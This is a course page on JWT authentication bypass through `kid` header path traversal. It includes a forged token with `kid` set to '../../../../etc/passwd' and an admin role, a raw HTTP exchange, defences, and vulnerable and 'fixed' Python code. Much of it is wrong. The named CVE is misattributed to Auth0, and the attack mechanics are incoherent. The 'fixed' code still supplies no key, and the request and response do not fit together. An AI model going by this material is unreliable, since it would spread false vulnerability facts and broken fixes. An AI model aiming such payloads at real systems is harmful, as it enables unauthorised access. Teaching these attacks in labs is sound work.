---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## JWT Authentication Bypass via `kid` Header Path Traversal

The `kid` (Key ID) header is used to identify which key should be used to verify the signature of the JWT. In some implementations, the `kid` value is used to load a specific key from a directory or database. If the implementation does not properly validate the `kid` value, an attacker can manipulate it to load a different key, potentially gaining unauthorized access.

### Real-World Example: CVE-2021-27065

CVE-2021-27065 is a critical vulnerability in the Auth0 platform, where an attacker could exploit the `kid` header to bypass authentication. By manipulating the `kid` value, an attacker could trick the system into accepting a maliciously crafted JWT, leading to unauthorized access.

### Step-by-Step Mechanics

Let's break down the steps involved in exploiting the `kid` header path traversal vulnerability:

1. **Identify the JWT**: Capture the JWT from a legitimate user's request.
2. **Decode the JWT**: Decode the JWT to inspect its contents.
3. **Manipulate the `kid` Header**: Modify the `kid` header to point to a different key.
4. **Forge a New JWT**: Create a new JWT with the manipulated `kid` header.
5. **Inject the Malicious JWT**: Send the malicious JWT in a request to the server.

### Complete Example

Consider the following JWT captured during a legitimate user's login:

```json
{
  "header": {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "public_key.pem"
  },
  "payload": {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239021,
    "roles": ["user"]
  },
  "signature": "..."
}
```

To exploit the `kid` header path traversal vulnerability, we can modify the `kid` value to point to a different key:

```json
{
  "header": {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "../../../../etc/passwd"
  },
  "payload": {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239021,
    "roles": ["admin"]
  },
  "signature": "..."
}
```

By injecting this malicious JWT into a request, the server may load the `/etc/passwd` file instead of the intended key, leading to unauthorized access.

### Raw HTTP Request and Response

Here is a complete example of the HTTP request and response:

#### HTTP Request

```http
POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlwvLi9cLi9cLi9cLi9ldGMvcGFzc3dkIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJyb2xlcyI6WyJhZG1pbiJdfQ.******

{
  "username": "john.doe",
  "password": "Peter"
}
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 23 May 2023 12:00:00 GMT
Content-Type: application/json
Set-Cookie: jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlwvLi9cLi9cLi9cLi9ldGMvcGFzc3dkIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJyb2xlcyI6WyJhZG1pbiJdfQ.******

{
  "message": "Login successful",
  "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlwvLi9cLi9cLi9cLi9ldGMvcGFzc3dkIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJyb2xlcyI6WyJhZG1pbiJdfQ.******"
}
```

### How to Prevent / Defend

#### Detection

- **Monitor JWT Usage**: Regularly audit JWT usage patterns to detect anomalies.
- **Log Suspicious Activity**: Log and alert on suspicious JWT manipulations or unauthorized access attempts.

#### Prevention

- **Validate `kid` Header**: Ensure the `kid` header value is validated against a whitelist of allowed values.
- **Use Strong Secret Keys**: Use strong, randomly generated secret keys for HMAC algorithms.
- **Avoid Path Traversal**: Implement proper input validation to prevent path traversal attacks.

#### Secure Coding Fixes

##### Vulnerable Code

```python
import jwt

def authenticate_user(token):
    try:
        payload = jwt.decode(token, options={"verify_signature": False})
        return payload['sub']
    except jwt.exceptions.DecodeError:
        return None
```

##### Fixed Code

```python
import jwt

def authenticate_user(token):
    try:
        payload = jwt.decode(token, options={"verify_signature": True})
        return payload['sub']
    except jwt.exceptions.DecodeError:
        return None
```

#### Configuration Hardening

- **Disable `none` Algorithm**: Ensure the `none` algorithm is disabled in the JWT configuration.
- **Use HTTPS**: Always use HTTPS to encrypt JWT transmission.

### Mermaid Diagrams

#### JWT Structure

```mermaid
graph TD;
    A[JWT] -->|Header| B[HMAC or RSA];
    A -->|Payload| C[Claims];
    A -->|Signature| D[Hashed Header & Payload];
```

#### JWT Flow

```mermaid
sequenceDiagram
    participant User
    participant Server
    User->>Server: Login Request
    Server-->>User: JWT
    User->>Server: Request with JWT
    Server-->>User: Response
```

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers comprehensive labs on JWT manipulation and other web security topics.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing various security attacks, including JWT manipulation.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for practicing web hacking techniques.

By thoroughly understanding JWTs and their potential vulnerabilities, developers can implement secure authentication mechanisms and protect against unauthorized access.

---
<!-- nav -->
[[08-JWT Attacks Bypassing Authentication via `kid` Header Path Traversal|JWT Attacks Bypassing Authentication via `kid` Header Path Traversal]] | [[Web Security (PortSwigger)/19-JWT Attacks/06-Lab 6 JWT authentication bypass via kid header path traversal/00-Overview|Overview]] | [[10-Lab Setup and Objective|Lab Setup and Objective]]
